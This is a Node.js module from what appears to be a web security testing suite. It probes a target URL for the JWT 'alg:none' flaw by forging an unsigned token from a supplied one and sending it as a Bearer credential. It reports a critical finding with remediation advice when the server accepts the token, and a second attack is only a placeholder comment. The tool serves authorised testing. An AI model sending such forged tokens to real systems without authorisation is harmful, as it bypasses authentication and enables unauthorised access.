#!/usr/bin/env node
'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: jwt-confusion-tester.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




const axios = require('axios');
const crypto = require('crypto');
const { getModuleById } = require('../lib/module-catalog');
const { parseArgs } = require('../lib/module-runner');
const { HttpHistoryLogger } = require('../utils/http-history-logger');

const definition = getModuleById('vuln-probes/jwt-confusion-tester');
const historyLogger = new HttpHistoryLogger();

async function run(argv = process.argv) {
  const { flags } = parseArgs(argv.slice(2));
  const url = flags.url;
  const originalToken = flags.token;

  if (!url || !originalToken) {
    console.log(`Usage: node ${definition.filePath} --url <target-url> --token <jwt-to-test>`);
    return;
  }

  console.log(`[*] Testing JWT confusion attacks on ${url}...`);
  const findings = [];
  const segments = originalToken.split('.');

  if (segments.length < 3) {
    console.log('[-] Provided token does not look like a full JWT.');
    return;
  }

  const header = JSON.parse(Buffer.from(segments[0], 'base64url').toString('utf8'));
  const payload = JSON.parse(Buffer.from(segments[1], 'base64url').toString('utf8'));

  // Attack 1: alg:none
  console.log('[*] Testing alg:none attack...');
  const noneHeader = { ...header, alg: 'none' };
  const noneToken = `${Buffer.from(JSON.stringify(noneHeader)).toString('base64url')}.${segments[1]}.`;

  try {
    const response = await axios.get(url, {
      headers: { Authorization: `Bearer ${noneToken}` },
      timeout: 10000,
      validateStatus: () => true
    });
    
    if (response.status === 200 && !response.data?.error) {
      findings.push({
        title: 'JWT Algorithm None Vulnerability (alg:none)',
        severity: 'Critical',
        target: url,
        tool: definition.id,
        cvss: '9.8',
        evidence: {
          request: `GET ${url}\nAuthorization: Bearer ${noneToken}`,
          response: `Status: ${response.status}\nServer accepted alg:none token.`
        },
        remediation: 'Disable the "none" algorithm in your JWT validation library. Use a strict whitelist of allowed algorithms (e.g., only HS256 or RS256).'
      });
      console.log(`[!] JWT VULNERABILITY: ${url} (alg:none success)`);
    }
  } catch (err) {
    // Skip
  }

  // Attack 2: RS256 to HS256 Confusion
  if (header.alg === 'RS256') {
    console.log('[*] Testing RS256 to HS256 confusion attack...');
    // This attack would require the public key (often available at JWKS endpoint)
    // We can't fully automate it without the public key, but we'll flag it as a potential risk.
  }

  if (findings.length > 0) {
    console.log(`[+] Found ${findings.length} JWT issues!`);
    process.stdout.write(JSON.stringify(findings, null, 2) + '\n');
  } else {
    console.log('[-] No JWT vulnerabilities detected via basic automation.');
  }

  return findings;
}

if (require.main === module) {
  run().catch(console.error);
}

module.exports = { run };
